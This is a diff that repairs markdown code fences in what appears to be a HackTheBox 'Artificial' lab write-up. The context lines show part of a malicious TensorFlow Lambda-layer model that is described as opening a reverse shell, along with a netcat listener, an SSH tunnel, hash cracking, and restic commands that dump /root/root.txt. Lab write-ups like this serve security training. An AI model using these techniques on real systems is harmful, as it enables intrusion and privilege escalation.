@@ -25,7 +25,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
-`
+```
 
 ## Initial foothold
 
@@ -58,7 +58,7 @@ model.add(tf.keras.layers.Input(shape=(64,)))
 model.add(tf.keras.layers.Lambda(exploit))
 model.compile()
 model.save("exploit.h5")
-`
+```
 
 This code creates a TensorFlow model that, when loaded or run, triggers a reverse shell to an attacker's machine using a malicious Lambda layer.
 
@@ -68,10 +68,8 @@ This malicious payload is run on the docker container and its file is copied fro
 
 ```
 sudo docker ps
-
-```
 sudo docker cp d41c59ca2285:/code/exploit.h5 .
-`
+```
 
 Then the generated h5 file is uploaded and a netcat listener is opened.
 
@@ -105,7 +103,7 @@ This command is used to SSH tunnel, to host the port 9898, locally;
 
 ```
 ssh -L 5000:localhost:5000 gael@10.10.11.74
-`
+```
 
 The hashed password is cracked, likely the root account of the backrest api being hosted on the port 9898.
 
@@ -126,6 +124,6 @@ restic init -r test
 backup -r test /root/root.txt
 -r test ls latest
 -r test dump latest /root/root.txt
-`
+```
 
 ![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Artificial/Screenshots/16.png)
